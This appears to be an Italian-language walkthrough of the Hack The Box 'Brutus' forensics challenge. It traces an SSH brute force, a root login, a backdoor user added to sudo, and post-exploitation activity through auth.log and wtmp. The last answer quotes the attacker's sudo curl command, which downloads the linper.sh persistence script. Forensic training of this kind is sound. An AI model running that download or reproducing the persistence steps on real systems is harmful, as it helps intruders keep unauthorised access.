# 🔍 Sherlock - Brutus | HTB CTF

> Very Easy | auth.log + wtmp | brute-force, escalation, persistenza

## 🧠 Scenario

In questo Sherlock (molto easy) si analizza `auth.log` e `wtmp` per ricostruire un attacco brute-force su un server Confluence. Dopo l’accesso SSH, l’attaccante esegue varie azioni che possiamo tracciare nei log.

---

## 1️⃣ Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

grep "Failed password" auth.log

Output:

Mar  6 06:31:33 ip-172-31-35-28 sshd[2329]: Failed password for invalid user admin from 65.2.161.68 port 46414 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2333]: Failed password for invalid user admin from 65.2.161.68 port 46452 ssh2
Mar  6 06:31:34 ip-172-31-35-28 sshd[2352]: Failed password for backup from 65.2.161.68 port 46568 ssh2

Risposta: 65.2.161.68

## 2️⃣ The bruteforce attempts were successful. What is the username of the account?

grep "Accepted password" auth.log

Output:

Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2

Risposta: root

## 3️⃣ Identify the UTC timestamp when the attacker logged in manually

Uso lo script utmp.py su wtmp:

python3 utmp.py -o wtmp.out wtmp
cat wtmp.out | grep 65.2.161.68

Output:

"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 07:32:45"   "387923"    "65.2.161.68"
"USER"  "2667"  "pts/1" "ts/1"  "cyberjunkie"   "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 07:37:35"   "475575"     "65.2.161.68"

Risposta: 2024-03-06 06:32:45 (UTC)

## 4️⃣ SSH login sessions are tracked... What is the session number?

grep "New session" auth.log

Output:

Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.

Risposta: 37

## 5️⃣ The attacker added a new user. What is the name of this account?

Lo vedo in auth.log:

Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2

Risposta: cyberjunkie

## 6️⃣ MITRE ATT&CK sub-technique ID for persistence?

Risposta: T1136.001 – Create Account: Local Account

## 7️⃣ What time did the attacker's first SSH session end?

Sessione 37, quindi cerco logout in auth.log:

2024-03-06 06:37:24

Risposta: 2024-03-06 06:37:24

## 8️⃣ Comando sudo per scaricare uno script

grep 'sudo' auth.log

Output:

Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
...
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Risposta:

/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

## 🧠 Considerazioni finali

CTF easy ma utile per ripassare concetti chiave:

    Lettura e analisi auth.log

    Uso di wtmp e utmp.py

    Tracciare brute-force

    Capire la differenza tra login e autenticazione

    Identificare attività post-exploitation (persistence + escalation)

Autore: Saitt01
Tool usati: grep, utmp.py, auth.log, wtmp
